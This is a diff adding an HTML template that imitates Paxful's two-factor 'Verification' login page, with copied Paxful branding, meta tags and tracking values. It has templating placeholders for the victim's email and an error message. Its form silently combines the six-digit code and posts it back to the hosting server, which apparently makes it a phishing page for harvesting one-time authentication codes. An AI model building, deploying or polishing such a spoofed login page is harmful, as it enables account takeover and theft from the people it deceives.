@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   
+    <link
+      rel="stylesheet"
+      href="https://accounts.paxful.com/_next/static/css/2d521eb3d418fc4b.css"
+      data-precedence="next"
+    />
+
+    <meta name="theme-color" content="#000000" />
+    <title>Login | Paxful</title>
+      <style>
+    .otp-input {
+      width: 3rem;
+      height: 3.5rem;
+      font-size: 1.5rem;
+      text-align: center;
+      border: 2px solid #000;
+      border-radius: 8px;
+      font-weight: bold;
+      margin: 0.3rem;
+    }
+
+    @media (max-width: 480px) {
+      .otp-input {
+        width: 2.3rem;
+        height: 3rem;
+        font-size: 1.2rem;
+        margin: 0.2rem;
+      }
+    }
+  </style>
+    <meta name="description" content="Login to your Paxful account" />
+    <link rel="canonical" href="https://accounts.paxful.com/login" />
+    <meta property="og:title" content="Login | Paxful" />
+    <meta property="og:description" content="Login to your Paxful account" />
+    <meta
+      property="og:image"
+      content="https://static.paxful.com/google-search-imagery/GS_Login.png"
+    />
+    <meta property="og:image:width" content="1600" />
+    <meta property="og:image:height" content="1001" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Login | Paxful" />
+    <meta name="twitter:description" content="Login to your Paxful account" />
+    <meta
+      name="twitter:image"
+      content="https://static.paxful.com/google-search-imagery/GS_Login.png"
+    />
+    <meta name="twitter:image:width" content="1600" />
+    <meta name="twitter:image:height" content="1001" />
+    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s" type="image/png" />
+    <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s" type="image/png" />
+    <meta
+      name="sentry-trace"
+      content="012a7aa94bf6113a29989cc6ab2a9992-5782be4ec9a0e409-0"
+    />
+    <meta
+      name="baggage"
+      content="sentry-environment=production,sentry-release=_aMkUzt9diM0yurh-t2EE,sentry-public_key=34d8d41960e64a9c85b91c358a8e90dd,sentry-trace_id=012a7aa94bf6113a29989cc6ab2a9992,sentry-sampled=false"
+    />
+    <script
+      src="/_next/static/chunks/polyfills-42372ed130431b0a.js"
+      nomodule=""
+    ></script>
+  </head>
+  <body class="__className_627f4f flex flex-col">
+    <script>
+      !(function () {
+        try {
+          var d = document.documentElement,
+            c = d.classList;
+          c.remove("dark", "light");
+          var e = localStorage.getItem("theme");
+          if ("system" === e || (!e && false)) {
+            var t = "(prefers-color-scheme: dark)",
+              m = window.matchMedia(t);
+            if (m.media !== t || m.matches) {
+              d.style.colorScheme = "dark";
+              c.add("dark");
+            } else {
+              d.style.colorScheme = "light";
+              c.add("light");
+            }
+          } else if (e) {
+            c.add(e || "");
+          } else {
+            c.add("dark");
+          }
+          if (e === "light" || e === "dark" || !e)
+            d.style.colorScheme = e || "dark";
+        } catch (e) {}
+      })();
+    </script>
+    <div class="flex flex-row">
+      <div
+        class="min-h-screen text-foreground max-[990px]:w-full min-[990px]:w-[498px] min-[990px]:shadow-[0_4px_8px_0_#FFFFFF40]"
+      >
+        <div class="flex size-full flex-col space-y-6 px-4 py-6 md:px-10">
+          <a href="https://paxful.com"
+            ><div
+              class="flex h-6 flex-row items-center space-x-2.5 md:h-8 mb-4"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 32 32"
+                class="aspect-square size-6 md:size-8"
+              >
+                <path
+                  fill="#C9F24D"
+                  d="M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z"
+                ></path></svg>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 103 34"
+                class="h-full text-foreground md:inline"
+              >
+                <g fill="currentColor">
+                  <path d="M102.625 0h-4.55v27.2h4.55z"></path>
+                  <path
+                    fill-rule="evenodd"
+                    d="M20.047 17.378c0 5.633-3.131 10.2-8.68 10.2-2.862 0-5.153-1.628-6.192-2.98V34H.625V7.556h4.55v2.602c1.04-1.353 3.33-2.98 6.192-2.98 5.549 0 8.68 4.567 8.68 10.2m-4.562-.006c0 3.52-2.352 6.375-5.254 6.375s-5.254-2.854-5.254-6.375 2.352-6.375 5.254-6.375 5.254 2.854 5.254 6.375"
+                    clip-rule="evenodd"
+                  ></path>
+                  <path
+                    d="M81.455 7.556h-4.55V20.95c0 3.451 2.04 6.627 6.242 6.627 3.075 0 5.085-1.29 6.212-3.184V27.2h4.55V7.556h-4.55V18.35c0 2.069-1.146 4.844-4.203 5.05-2.473.165-3.7-1.526-3.7-3.907zM74.553 3.953V0H71.91c-.7 0-1.051 0-1.346.03a6.04 6.04 0 0 0-5.418 5.422 7 7 0 0 0-.026.592h-.003V27.2h4.55V12.089h4.305V7.556H69.67c0-1.058 0-2.168.205-2.572.181-.355.47-.644.825-.825.404-.206.932-.206 1.989-.206z"
+                  ></path>
+                  <path
+                    fill-rule="evenodd"
+                    d="M23.211 13.978h4.585c.03-1.45.819-3.544 4.41-3.544 3.627 0 3.834 1.318 3.83 2.554l-.001.127c0 .751-.134 1.308-.84 1.849-.703.538-1.742.559-2.679.578h-.015q-.41.008-.823.013h-.001c-1.763.024-3.586.049-5.267.554-2.971.892-4.665 3.293-4.099 6.747.25 1.502 1.65 4.91 6.793 4.91 3.717 0 6.137-1.727 6.996-2.976v2.41h4.55V16.244l.002-.674v-.005q.002-.373.006-.736c.045-4.335.08-7.651-8.535-7.651-5.865 0-8.682 2.89-8.912 6.8m3.757 7.957c-.077-1.69.98-2.99 3.19-3.278a18 18 0 0 1 1.852-.218c.703-.052 1.63-.105 2.425-.237 1.514-.299 1.833-.755 1.833-.755v1.495c0 3.863-3 5.704-5.693 5.704-1.974 0-3.513-.953-3.607-2.711"
+                    clip-rule="evenodd"
+                  ></path>
+                  <path
+                    d="M62.617 7.49h-5.254l-4.484 6.232-4.484-6.231H43.14l7.111 9.88-7.111 9.882h5.254l4.484-6.231 4.484 6.231h5.254l-7.111-9.881z"
+                  ></path>
+                </g>
+              </svg></div>
+          </a>
+     <div class="mb-6">
+  <a
+    class="relative flex cursor-pointer items-center justify-center whitespace-nowrap no-underline disabled:cursor-not-allowed [&:where(a)]:inline-flex text-[14px]"
+    href="javascript:void(0);"
+    onclick="history.back();"
+  >
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      width="20"
+      height="20"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      class="lucide lucide-chevron-left"
+    >
+      <path d="m15 18-6-6 6-6"></path>
+    </svg>
+    Back
+  </a>
+</div>
+
+<!-- Heading + subtext aligned left -->
+<div class="text-left">
+  <h2 class="mb-3 text-[32px] font-semibold leading-10 tracking-[-4%]">
+    Verification
+  </h2>
+  <p class="text-sm text-tertiary">
+    Enter the 6-digit code we sent to the authenticator associated
+    with your account:
+    <span class="font-semibold text-foreground">
+      {{ email }}
+    </span>
+  </p>
+</div>
+
+<!-- OTP Form aligned left -->
+<form
+  class="flex flex-col items-start gap-6"
+  action=""
+  method="POST"
+  id="twoFactorForm"
+>
+  <!-- OTP Input Boxes -->
+  <div class="flex gap-2">
+    <input type="text" name="code1" id="code1" maxlength="1" required
+      oninput="validateAndMove(this, 'code2')"
+      onkeydown="handleBackspace(event, this, null)"
+      onpaste="handlePaste(event)"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+    <input type="text" name="code2" id="code2" maxlength="1" required
+      oninput="validateAndMove(this, 'code3')"
+      onkeydown="handleBackspace(event, this, 'code1')"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+    <input type="text" name="code3" id="code3" maxlength="1" required
+      oninput="validateAndMove(this, 'code4')"
+      onkeydown="handleBackspace(event, this, 'code2')"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+    <input type="text" name="code4" id="code4" maxlength="1" required
+      oninput="validateAndMove(this, 'code5')"
+      onkeydown="handleBackspace(event, this, 'code3')"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+    <input type="text" name="code5" id="code5" maxlength="1" required
+      oninput="validateAndMove(this, 'code6')"
+      onkeydown="handleBackspace(event, this, 'code4')"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+    <input type="text" name="code6" id="code6" maxlength="1" required
+      oninput="validateAndMove(this, null, true)"
+      onkeydown="handleBackspace(event, this, 'code5')"
+      class="text-center text-2xl border border-gray-400 rounded-md bg-container font-semibold dark:border-gray-600"
+      style="width: 65px; height: 75px; border: 2px solid #000;" />
+  </div>
+    {% if error %}
+      <div style="color: red; font-weight: bold; margin-top: 10px;">
+        {{ error }}
+      </div>
+    {% endif %}
+
+
+  <!-- Hidden field for combined OTP -->
+  <input type="hidden" name="otp_code" id="otp_code" />
+
+</form>
+
+
+<script>
+  function validateAndMove(current, nextId, isLast = false) {
+    if (current.value.length === 1) {
+      if (isLast) {
+        combineOTP();
+        document.getElementById("twoFactorForm").submit();
+      } else if (nextId) {
+        document.getElementById(nextId).focus();
+      }
+    }
+  }
+
+  function handleBackspace(event, current, prevId) {
+    if (event.key === "Backspace" && current.value === "" && prevId) {
+      document.getElementById(prevId).focus();
+    }
+  }
+
+  function handlePaste(e) {
+    const paste = e.clipboardData.getData("text").trim();
+    const inputs = document.querySelectorAll('#twoFactorForm input[type="text"]');
+    if (paste.length === inputs.length) {
+      inputs.forEach((input, index) => {
+        input.value = paste[index] || "";
+      });
+      combineOTP();
+      inputs[inputs.length - 1].focus();
+      document.getElementById("twoFactorForm").submit();
+      e.preventDefault();
+    }
+  }
+
+  function combineOTP() {
+    const inputs = document.querySelectorAll('#twoFactorForm input[type="text"]');
+    let otp = "";
+    inputs.forEach(input => otp += input.value);
+    document.getElementById("otp_code").value = otp;
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("code1").focus();
+  });
+</script>
+  
+  </body>
+</html>
